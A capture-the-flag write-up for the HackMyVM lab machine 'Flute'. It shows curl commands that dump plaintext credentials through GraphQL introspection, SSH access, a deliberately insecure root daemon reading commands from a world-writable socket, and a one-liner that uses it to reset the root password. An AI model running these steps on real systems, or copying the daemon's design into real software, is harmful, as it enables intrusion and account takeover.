# Flute

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Flute | sml | Beginner | HackMyVM |

**Summary:** Flute is a beginner level vulnerable machine that demonstrates the dangers of exposing GraphQL introspection queries and insecure inter-process communication mechanisms. The exploitation path begins with a GraphQL API endpoint running on port 8888 that permits full schema introspection, revealing a User type containing plaintext username and password fields. Through systematic GraphQL queries, an attacker can enumerate the complete schema structure, discover available query operations, and ultimately extract credentials for multiple system accounts directly from the database. The recovered credentials provide SSH access to the system as a low-privileged user, leading to the discovery of a custom Python daemon listening on a Unix domain socket with world-writable permissions. This daemon executes arbitrary system commands with root privileges without any authentication or input validation, allowing a trivial privilege escalation by injecting a password change command through the socket interface. The machine exemplifies how seemingly innocuous misconfigurations in modern APIs combined with overly permissive system services can create complete compromise scenarios.

---

## Reconnaissance and Initial Enumeration

**1. Network Discovery**

The initial phase involved identifying the target machine within the local network using a PowerShell network scanning script. The scan revealed a VirtualBox virtual machine at IP address 192.168.100.162.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.162 08:00:27:9E:1D:7B VirtualBox
```

**2. Port Scanning and Service Enumeration**

A comprehensive Nmap scan was executed against all 65535 TCP ports to identify available services and potential attack vectors. The scan revealed two open ports: SSH on port 22 and an unusual HTTP service on port 8888.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flute]
└─$ ip=192.168.100.162 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flute]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-03 21:00 WIB
Nmap scan report for 192.168.100.162
Host is up (0.0071s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 10.0 (protocol 2.0)
8888/tcp open  sun-answerbook?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, JavaRMI, LSCP, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest, GetRequest:
|     HTTP/1.1 400 Bad Request
|     Access-Control-Allow-Origin: *
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18
|     ETag: W/"12-7JEJwpG8g89ii7CR/6hhfN27Q+k"
|     Date: Fri, 03 Apr 2026 14:00:30 GMT
|     Connection: close
|     query missing.
|   HTTPOptions:
|     HTTP/1.1 204 No Content
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
|     Vary: Access-Control-Request-Headers
|     Content-Length: 0
|     Date: Fri, 03 Apr 2026 14:00:30 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 204 No Content
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
|     Vary: Access-Control-Request-Headers
|     Content-Length: 0
|     Date: Fri, 03 Apr 2026 14:00:35 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.95%I=7%D=4/3%Time=69CFC800%P=x86_64-pc-linux-gnu%r(Get
SF:Request,EC,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nAccess-Control-Allow-
SF:Origin:\x20\*\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nConten
SF:t-Length:\x2018\r\nETag:\x20W/\"12-7JEJwpG8g89ii7CR/6hhfN27Q\+k\"\r\nDa
SF:te:\x20Fri,\x2003\x20Apr\x202026\x2014:00:30\x20GMT\r\nConnection:\x20c
SF:lose\r\n\r\nGET\x20query\x20missing\.")%r(HTTPOptions,EA,"HTTP/1\.1\x20
SF:204\x20No\x20Content\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Co
SF:ntrol-Allow-Methods:\x20GET,HEAD,PUT,PATCH,POST,DELETE\r\nVary:\x20Acce
SF:ss-Control-Request-Headers\r\nContent-Length:\x200\r\nDate:\x20Fri,\x20
SF:03\x20Apr\x202026\x2014:00:30\x20GMT\r\nConnection:\x20close\r\n\r\n")%
SF:r(FourOhFourRequest,EC,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nAccess-Co
SF:ntrol-Allow-Origin:\x20\*\r\nContent-Type:\x20text/html;\x20charset=utf
SF:-8\r\nContent-Length:\x2018\r\nETag:\x20W/\"12-7JEJwpG8g89ii7CR/6hhfN27
SF:Q\+k\"\r\nDate:\x20Fri,\x2003\x20Apr\x202026\x2014:00:30\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\nGET\x20query\x20missing\.")%r(JavaRMI,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(LSCP,
SF:2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n"
SF:)%r(RTSPRequest,EA,"HTTP/1\.1\x20204\x20No\x20Content\r\nAccess-Control
SF:-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Methods:\x20GET,HEAD,PUT,P
SF:ATCH,POST,DELETE\r\nVary:\x20Access-Control-Request-Headers\r\nContent-
SF:Length:\x200\r\nDate:\x20Fri,\x2003\x20Apr\x202026\x2014:00:35\x20GMT\r
SF:\nConnection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCook
SF:ie,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r
SF:\n")%r(TLSSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.67 seconds
```

The HTTP response headers and error messages provided crucial hints. The responses included messages like "query missing" and specific CORS headers (Access-Control-Allow-Origin: *), suggesting a modern web API rather than a traditional web server.

---

## Web Application Analysis

**3. Apollo GraphQL Server Discovery**

Navigating to port 8888 in a web browser revealed an Apollo Server landing page, immediately identifying the service as a GraphQL API endpoint.

![](image.png)

Examining the page source code confirmed the Apollo Server implementation. The HTML contained references to Apollo's CDN assets and indicated the server was running in non-production mode, as evidenced by the embedded configuration: `window.landingPage = "%7B%22isProd%22%3Afalse%7D"`.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <link
      rel="icon"
      href="https://apollo-server-landing-page.cdn.apollographql.com/_latest/assets/favicon.png"
    />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro&display=swap"
      rel="stylesheet"
    />
    <meta name="theme-color" content="#000000" />
    <meta name="description" content="Apollo server landing page" />
    <link
      rel="apple-touch-icon"
      href="https://apollo-server-landing-page.cdn.apollographql.com/_latest/assets/favicon.png"
    />
    <link
      rel="manifest"
      href="https://apollo-server-landing-page.cdn.apollographql.com/_latest/manifest.json"
    />
    <title>Apollo Server</title>
  </head>
  <body style="margin: 0; overflow-x: hidden; overflow-y: hidden">
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="react-root">
      <style>
        .fallback {
          opacity: 0;
          animation: fadeIn 1s 1s;
          animation-iteration-count: 1;
          animation-fill-mode: forwards;
          padding: 1em;
        }
        @keyframes fadeIn {
          0% {opacity:0;}
          100% {opacity:1; }
        }
      </style>
    
 <div class="fallback">
  <h1>Welcome to Apollo Server</h1>
  <p>The full landing page cannot be loaded; it appears that you might be offline.</p>
</div>
<script>window.landingPage = "%7B%22isProd%22%3Afalse%7D";</script>
<script src="https://apollo-server-landing-page.cdn.apollographql.com/_latest/static/js/main.js"></script>
    </div>
  </body>
</html>
```

---

## GraphQL Introspection and Information Disclosure

**4. Schema Enumeration**

GraphQL introspection is a powerful feature that allows clients to query the schema structure itself. When improperly secured, it becomes a reconnaissance goldmine. The first introspection query targeted the `__schema` object to enumerate all available types in the API.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flute]
└─$ curl -X POST http://192.168.100.162:8888/ \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { types { name } } }"}'
{"data":{"__schema":{"types":[{"name":"User"},{"name":"String"},{"name":"Query"},{"name":"Boolean"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}
```

This query revealed a custom "User" type alongside standard GraphQL introspection types, immediately suggesting that user data was being exposed through the API.

**5. User Type Field Discovery**

Having identified the User type, the next introspection query examined its field structure to understand what user attributes were accessible.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flute]
└─$ curl -X POST http://192.168.100.162:8888/ \
-H "Content-Type: application/json" \
-d '{"query": "{ __type(name: \"User\") { fields { name } } }"}'
{"data":{"__type":{"fields":[{"name":"username"},{"name":"password"}]}}}
```

The response exposed a critical security flaw: the User type contained both "username" and "password" fields, strongly indicating that plaintext passwords were being stored and exposed through the API.

**6. Query Operations Discovery**

To determine how to retrieve user data, the Query root type was examined to identify available query operations.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flute]
└─$ curl -X POST http://192.168.100.162:8888/ \
-H "Content-Type: application/json" \
-d '{"query": "{ __type(name: \"Query\") { fields { name } } }"}'
{"data":{"__type":{"fields":[{"name":"users"},{"name":"user"}]}}}
```

The API supported both "users" (likely returning all users) and "user" (likely returning a single user) query operations, providing multiple pathways to extract credentials.

---

## Initial Access Through Credential Extraction

**7. Password Harvesting via GraphQL**

With complete knowledge of the schema structure, a final query was constructed to extract all usernames and their corresponding plaintext passwords from the database.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flute]
└─$ curl -X POST http://192.168.100.162:8888/ \
-H "Content-Type: application/json" \
-d '{"query": "{ users { username password } }"}'
{"data":{"users":[{"username":"admin","password":"imtherealadmin"},{"username":"hamelin","password":"comewithmerats"}]}}
```

The query successfully returned credentials for two accounts: admin:imtherealadmin and hamelin:comewithmerats. These credentials represented a complete authentication bypass, providing potential access to the underlying system.

**8. SSH Authentication**

Using the extracted credentials, SSH authentication was attempted for the hamelin account, which proved successful and granted shell access to the Alpine Linux system.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/flute]
└─$ ssh hamelin@$ip
The authenticity of host '192.168.100.162 (192.168.100.162)' can't be established.
ED25519 key fingerprint is: SHA256:pQL6MCusRtFF6QNd7BL9RBACLaGEw9epVnuBo3D9ETc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.162' (ED25519) to the list of known hosts.
hamelin@192.168.100.162's password:
HackMyVM Flute.
flute:~$ id
uid=1000(hamelin) gid=1000(hamelin) groups=1000(hamelin)
flute:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/sh
hamelin:x:1000:1000::/home/hamelin:/bin/sh
flute:~$ which sudo
flute:~$ uname -a
Linux flute 6.12.79-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2026-03-27 13:26:20 x86_64 Linux
flute:~$
```

Basic enumeration confirmed the system was running Alpine Linux with kernel version 6.12.79. The sudo binary was not installed, eliminating traditional privilege escalation paths.

---

## Post-Exploitation and Internal Enumeration

**9. User Directory Analysis**

Examining the hamelin home directory revealed the Node.js application files responsible for the GraphQL API service, along with the user flag.

```bash
flute:~$ ls -la
total 108
drwxr-sr-x    4 hamelin  hamelin       4096 Mar 30 09:40 .
drwxr-xr-x    3 root     root          4096 Mar 30 09:36 ..
lrwxrwxrwx    1 hamelin  hamelin          9 Mar 30 09:38 .ash_history -> /dev/null
-rw-------    1 hamelin  hamelin          9 Mar 30 09:41 .node_repl_history
drwxr-sr-x    4 hamelin  hamelin       4096 Mar 30 09:38 .npm
-rw-r--r--    1 hamelin  hamelin        680 Mar 30 09:39 index.js
drwxr-sr-x  126 hamelin  hamelin       4096 Mar 30 09:39 node_modules
-rw-r--r--    1 hamelin  hamelin      77592 Mar 30 09:39 package-lock.json
-rw-r--r--    1 hamelin  hamelin        326 Mar 30 09:39 package.json
-rw-------    1 hamelin  hamelin         28 Mar 30 09:38 user.txt
```

Notably, the .ash_history file was symlinked to /dev/null, indicating command history was being actively prevented from persisting.

**10. System-Wide Reconnaissance**

Further enumeration discovered a custom application directory in /opt/ratd containing a Python script named ratd.py.

```bash
flute:~$ ls -la /opt
total 12
drwxr-xr-x    3 root     root          4096 Mar 30 09:41 .
drwxr-xr-x   21 root     root          4096 Mar 30 09:35 ..
drwxr-xr-x    2 root     root          4096 Mar 30 09:42 ratd
flute:~$ cd /opt/ratd/
flute:/opt/ratd$ ls -la
total 12
drwxr-xr-x    2 root     root          4096 Mar 30 09:42 .
drwxr-xr-x    3 root     root          4096 Mar 30 09:41 ..
-rw-r--r--    1 root     root           527 Mar 30 09:42 ratd.py
```

**11. Daemon Analysis**

Examining the ratd.py source code revealed an extremely insecure daemon design that accepted commands via a Unix domain socket and executed them with elevated privileges.

```bash
flute:/opt/ratd$ cat ratd.py
import socket
import os

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
socket_path = "/tmp/ratd.sock"

if os.path.exists(socket_path):
    os.remove(socket_path)

sock.bind(socket_path)
os.chmod(socket_path, 0o777)
sock.listen(1)

print("Rat daemon running...")

while True:
    conn, _ = sock.accept()
    data = conn.recv(1024).decode()

    if data.startswith("RUN "):
        cmd = data[4:]
        os.system(cmd)
        conn.send(b"OK\n")
    else:
        conn.send(b"Unknown command\n")

    conn.close()
```

The daemon's vulnerabilities were immediately apparent:

1. The socket file (/tmp/ratd.sock) was created with 0777 permissions, making it world-writable
2. Commands prefixed with "RUN " were executed directly via os.system() with no authentication
3. No input validation or sanitization was performed
4. The daemon ran with root privileges (as confirmed by ownership)

**12. SUID Binary Search**

A search for SUID binaries revealed /bin/bbsuid, but this was a standard BusyBox SUID component on Alpine Linux and not a viable escalation vector.

```bash
flute:/opt/ratd$ find / -perm -4000 -exec ls -la {} \; 2>/dev/null
---s--x--x    1 root     root         14224 Nov 21 22:40 /bin/bbsuid
```

**13. Network Service Validation**

Network analysis confirmed the GraphQL Node.js service was listening on port 8888, but more importantly, no other suspicious network services were detected that might indicate the ratd daemon's listening state.

```bash
flute:/opt/ratd$ which ss
flute:/opt/ratd$ which netstat
/bin/netstat
flute:/opt/ratd$ netstat -tlpn
netstat: showing only processes with your user ID
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
tcp        0      0 :::8888                 :::*                    LISTEN      2209/node
```

This output confirmed that the ratd daemon was listening on a Unix domain socket rather than a network socket, making it invisible to standard network monitoring tools but still accessible from the local system.

---

## Privilege Escalation

**14. Unix Socket Exploitation**

With the understanding that the ratd daemon accepted arbitrary commands through /tmp/ratd.sock and executed them with root privileges, privilege escalation became trivial. A Python script was crafted to connect to the socket and inject a command to change the root password.

```bash
flute:~$ python3 -c "
> import socket
> s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
> s.connect('/tmp/ratd.sock')
> s.send(b'RUN echo \"root:hacked\" | chpasswd\n')
> print(s.recv(1024).decode())
> s.close()
> "
OK
```

The daemon responded with "OK", confirming successful command execution. The chpasswd command modified the root password to "hacked" without requiring the current password, as the command was executed with root privileges.

**15. Root Access and Flag Capture**

Using the newly set password, authentication as root was achieved via the su command, granting complete system control.

```bash
flute:~$ su - root
Password:
flute:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
root
flute
flute:~# cat /home/hamelin/user.txt /root/root.txt
HMVuser9f4[REDACTED]
HMVrootoep[REDACTED]
```

Both user and root flags were successfully captured, completing full compromise of the target system.

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified the target at 192.168.100.162 with SSH (port 22) and an unknown HTTP service (port 8888) exposed. Initial HTTP analysis revealed an Apollo GraphQL server running in non-production mode.

2. **Vulnerability Discovery**: GraphQL introspection queries were permitted without authentication, allowing complete schema enumeration. The schema exposed a User type containing username and password fields, indicating plaintext credential storage. Query operations "users" and "user" were identified as the retrieval mechanisms.

3. **Exploitation**: A GraphQL query requesting all users with their username and password fields successfully extracted credentials for two accounts (admin:imtherealadmin and hamelin:comewithmerats). The hamelin credentials provided valid SSH authentication to the Alpine Linux system.

4. **Internal Enumeration**: Post-compromise reconnaissance discovered a custom Python daemon (ratd.py) in /opt/ratd that listened on a Unix domain socket at /tmp/ratd.sock with world-writable permissions. The daemon accepted commands prefixed with "RUN " and executed them via os.system() without authentication or validation.

5. **Privilege Escalation**: A Python socket script was used to connect to /tmp/ratd.sock and inject a root password change command. Since the daemon ran with root privileges and lacked input sanitization, the command executed successfully. Authentication as root using the new password completed the privilege escalation, yielding both user and root flags.

